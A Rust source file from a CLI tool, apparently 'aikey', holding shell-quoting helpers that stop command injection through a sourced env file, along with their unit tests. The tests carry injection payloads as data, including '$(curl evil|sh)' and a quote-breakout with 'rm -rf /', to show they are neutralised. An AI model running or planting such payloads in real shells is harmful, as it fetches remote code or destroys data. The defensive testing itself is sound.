//! Shell-safe value quoting — single source of truth for escaping values that
//! get written into shell-evaluated files (`~/.aikey/active.env`) or emitted as
//! `eval`-able shell output.
//!
//! ## Why this exists (Why)
//!
//! `~/.aikey/active.env` is `source`-d by the zsh/bash prompt hook on every
//! prompt (precmd). Several of the values written into it are NOT under CLI
//! control — most notably the display alias of a managed (team/cluster)
//! virtual key, which is synced down from the server, and a cluster node's
//! real token / base URL. If such a value contains shell metacharacters
//! (`$(...)`, backticks, `${...}`, an unbalanced quote), a naive
//! `export KEY="$VALUE"` line would let the value execute as code the next
//! time the file is sourced. That is a command-injection / RCE surface
//! reachable through the sync channel in the team/cluster editions.
//!
//! ## How it's safe (How)
//!
//! Single-quoting is the only fully-inert quoting in POSIX sh: inside `'...'`
//! NOTHING is expanded — not `$`, not backticks, not `\`. The single subtlety
//! is embedding a literal single quote, which is done with the canonical
//! `'\''` idiom (close-quote, escaped-quote, reopen-quote). PowerShell's
//! single-quoted strings are likewise literal, with `'` escaped by doubling.
//!
//! These helpers are the authoritative defense (we never trust upstream to
//! have validated the value); input-side `validate_alias` is complementary
//! hardening, not a substitute.

/// Wrap a value for safe literal use inside POSIX sh/bash/zsh.
/// Returns the fully-quoted token (including the surrounding single quotes),
/// e.g. `sh_single_quote("a'b")` → `'a'\''b'`.
pub(crate) fn sh_single_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

/// Wrap a value for safe literal use inside a PowerShell single-quoted string.
/// Internal single quotes are doubled (`'` → `''`).
pub(crate) fn powershell_single_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "''"))
}

/// Render a single `export KEY=VALUE` line for `~/.aikey/active.env`.
///
/// Single source of truth for the quoting policy shared by both active.env
/// writers (`profile_activation` and `commands_account::shell_integration`):
///
/// - By default the VALUE is single-quoted (`sh_single_quote`) so untrusted
///   content — a server-synced managed-key alias, a cluster node's token or
///   base URL — cannot execute when the file is `source`-d on every prompt.
/// - Two keys are kept DOUBLE-quoted because downstream string-matching depends
///   on the literal double quotes, and their values are CLI-controlled (so they
///   need no escaping):
///     * `AIKEY_ACTIVE_SEQ` — the zsh/bash hooks detect it with
///       `grep -oE 'AIKEY_ACTIVE_SEQ="[0-9]+"'`.
///     * `no_proxy` / `NO_PROXY` — `shell_integration` rewrites the
///       double-quoted literal into the `${no_proxy:-}` append form.
pub(crate) fn active_env_export_line(key: &str, value: &str) -> String {
    match key {
        "AIKEY_ACTIVE_SEQ" | "no_proxy" | "NO_PROXY" => format!("export {}=\"{}\"", key, value),
        _ => format!("export {}={}", key, sh_single_quote(value)),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sh_neutralizes_command_substitution() {
        // The classic injection payload must end up inert (fully inside '...').
        assert_eq!(sh_single_quote("$(touch /tmp/pwn)"), "'$(touch /tmp/pwn)'");
        assert_eq!(sh_single_quote("`id`"), "'`id`'");
        assert_eq!(sh_single_quote("${HOME}"), "'${HOME}'");
    }

    #[test]
    fn sh_handles_embedded_single_quote() {
        // close-quote, escaped-quote, reopen-quote
        assert_eq!(sh_single_quote("a'b"), "'a'\\''b'");
        // A payload that tries to break out via a quote stays contained.
        assert_eq!(
            sh_single_quote("'; rm -rf /; '"),
            "''\\''; rm -rf /; '\\'''"
        );
    }

    #[test]
    fn sh_passes_benign_values_unchanged_in_content() {
        assert_eq!(
            sh_single_quote("aikey_active_anthropic"),
            "'aikey_active_anthropic'"
        );
        assert_eq!(sh_single_quote("my-key"), "'my-key'");
    }

    #[test]
    fn powershell_doubles_single_quote() {
        assert_eq!(powershell_single_quote("a'b"), "'a''b'");
        assert_eq!(powershell_single_quote("plain"), "'plain'");
    }

    // ── active_env_export_line: the shared active.env quoting policy ──────────

    #[test]
    fn export_line_single_quotes_untrusted_values() {
        // A server-synced alias carrying a command-substitution payload must be
        // rendered inert (single-quoted), so sourcing the line cannot execute it.
        assert_eq!(
            active_env_export_line("AIKEY_ACTIVE_KEYS", "anthropic=$(curl evil|sh)"),
            "export AIKEY_ACTIVE_KEYS='anthropic=$(curl evil|sh)'"
        );
        assert_eq!(
            active_env_export_line("ANTHROPIC_API_KEY", "aikey_active_anthropic"),
            "export ANTHROPIC_API_KEY='aikey_active_anthropic'"
        );
        // A cluster base URL is single-quoted too.
        assert_eq!(
            active_env_export_line("ANTHROPIC_BASE_URL", "http://10.0.0.5:27200/anthropic"),
            "export ANTHROPIC_BASE_URL='http://10.0.0.5:27200/anthropic'"
        );
    }

    #[test]
    fn export_line_keeps_seq_double_quoted_for_hook_grep() {
        // hook.zsh / hook.bash grep `AIKEY_ACTIVE_SEQ="[0-9]+"` — literal double
        // quotes. Changing this to single quotes would silently disable the
        // cheap precmd seq-diff fast path.
        assert_eq!(
            active_env_export_line("AIKEY_ACTIVE_SEQ", "42"),
            "export AIKEY_ACTIVE_SEQ=\"42\""
        );
    }

    #[test]
    fn export_line_keeps_no_proxy_double_quoted_for_replace() {
        // shell_integration rewrites the double-quoted no_proxy literal into the
        // `${no_proxy:-}` append form via String::replace; single-quoting would
        // break that match and clobber the user's existing no_proxy.
        assert_eq!(
            active_env_export_line("no_proxy", "127.0.0.1,localhost"),
            "export no_proxy=\"127.0.0.1,localhost\""
        );
        assert_eq!(
            active_env_export_line("NO_PROXY", "127.0.0.1,localhost"),
            "export NO_PROXY=\"127.0.0.1,localhost\""
        );
    }
}
